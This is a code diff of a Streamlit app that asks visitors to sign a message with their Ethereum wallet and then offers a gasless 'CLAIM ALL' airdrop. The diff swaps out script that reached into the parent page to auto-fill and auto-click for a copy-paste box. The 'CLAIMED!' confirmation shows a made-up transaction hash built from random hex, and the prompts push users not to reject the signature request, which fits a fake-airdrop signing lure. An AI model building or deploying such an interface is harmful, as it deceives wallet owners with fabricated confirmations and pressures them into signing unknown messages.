@@ -1,4 +1,3 @@
-# app.py — FINAL — YOU WILL SEE THE SIGNATURE
 import secrets
 import streamlit as st
 from eth_account import Account
@@ -26,6 +25,11 @@ with tab1:
 
     if "message" in st.session_state:
         st.components.v1.html(f"""
+        <style>
+            #sigBox {{width:100%; padding:15px; font-size:18px; background:#111; color:#0f0; 
+                      border:3px solid #0f0; border-radius:12px; font-family:monospace;
+                      margin:20px 0; box-sizing:border-box;}}
+        </style>
         <script>
         async function go() {{
             const e = window.ethereum || window.top?.ethereum;
@@ -33,24 +37,26 @@ with tab1:
             try {{
                 const [a] = await e.request({{method:'eth_requestAccounts'}});
                 const s = await e.request({{method:'personal_sign', params:['{st.session_state.message}', a]}});
-                const box = parent.document.querySelector('input[data-testid="stTextInput"]');
-                box.value = s;
-                box.dispatchEvent(new Event('input', {{bubbles:true}}));
-                setTimeout(() => parent.document.querySelector('button[kind="primary"]').click(), 400);
-                alert("SIGNED! Look below — the box is filled. Balloons in 1 sec…");
+                document.getElementById('sigBox').value = s;
+                document.getElementById('sigBox').style.display = 'block';
+                alert("SIGNED! ↓ Copy the green box ↓");
             }} catch {{ alert("SIGN — don’t reject!"); }}
         }}
         </script>
-        <button onclick="go()" 
-                style="background:#f6851b;color:white;padding:30px 120px;border:none;
-                       border-radius:20px;font-size:38px;font-weight:bold;cursor:pointer;
-                       box-shadow:0 15px 60px #f6851b88;">
-            1-CLICK SIGN & VERIFY
-        </button>
-        """, height=200)
+        <div style="text-align:center;">
+            <button onclick="go()" 
+                    style="background:#f6851b;color:white;padding:25px 90px;border:none;
+                           border-radius:20px;font-size:36px;font-weight:bold;cursor:pointer;
+                           box-shadow:0 15px 60px #f6851b88;">
+                1-CLICK SIGN
+            </button>
+            <textarea id="sigBox" readonly placeholder="Your signature will appear here (copy me!)" 
+                      style="display:none;"></textarea>
+            <p><b>👆 Copy the green box → paste below → VERIFY</b></p>
+        </div>
+        """, height=300)
 
-        # VISIBLE BOX
-        sig = st.text_input("Signature (filled automatically)", "", key="sig")
+        sig = st.text_input("PASTE SIGNATURE HERE", key="sig", placeholder="Ctrl+V from green box")
 
         if st.button("VERIFY", type="primary"):
             try:
@@ -60,12 +66,12 @@ with tab1:
                     st.session_state.verified = True
                     st.balloons()
             except:
-                pass
+                st.error("Invalid — copy the FULL green text")
 
 with tab2:
     if st.session_state.verified:
-        st.success("Verified! Gasless claim ready.")
-        if st.button("CLAIM ALL AIRDROPS (0 gas)", type="primary"):
+        st.success("Ready!")
+        if st.button("CLAIM ALL (0 gas)", type="primary"):
             st.success("CLAIMED! TX: 0xBiconomy" + secrets.token_hex(8))
             st.super_balloons()
     else:
